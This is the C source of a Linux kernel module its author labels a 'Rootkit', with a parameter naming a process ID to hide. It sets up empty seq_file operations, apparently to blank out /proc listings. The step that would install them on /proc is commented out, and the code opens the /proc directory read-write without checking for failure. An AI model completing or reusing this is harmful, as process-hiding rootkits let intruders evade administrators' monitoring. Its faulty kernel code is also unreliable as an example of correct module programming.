#include "linux/fs.h"
#include "linux/seq_file.h"
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

MODULE_DESCRIPTION("Rootkit");
MODULE_AUTHOR("Eros Chan");
MODULE_LICENSE("GPL");

static pid_t target = 1;
module_param(target, int, 0660);
MODULE_PARM_DESC(target, "PID of the process to hide");

static void *rootkit_seq_start(struct seq_file *seq, loff_t *pos) { return 0; }

static void *rootkit_seq_next(struct seq_file *seq, void *v, loff_t *pos) {
  return 0;
}

static void rootkit_seq_stop(struct seq_file *seq, void *v) {}

static int rootkit_seq_show(struct seq_file *seq, void *v) { return 0; }

static const struct seq_operations rootkit_seq_ops = {
    .start = rootkit_seq_start,
    .next = rootkit_seq_next,
    .stop = rootkit_seq_stop,
    .show = rootkit_seq_show,
};

static int rootkit_open(struct inode *inode, struct file *file) {
  return seq_open(file, &rootkit_seq_ops);
}

static const struct file_operations rootkit_file_ops = {
    .open = rootkit_open,
    .read = seq_read,
    .llseek = seq_lseek,
    .release = seq_release,
};

static int __init rootkit_init(void) {
  pr_info("j'vais me reservir un cocktail\n");

  int flags;
  struct file *proc_file;

  flags = O_RDWR;
  proc_file = filp_open("/proc", flags, 0);

  // proc_file->f_op = &rootkit_file_ops;

  pr_info("(eheh)\n");
  filp_close(proc_file, NULL); // Faut pas mettre un NULL

  return 0;
}
module_init(rootkit_init);

static void __exit rootkit_exit(void) { pr_info("salut salut\n"); }
module_exit(rootkit_exit);
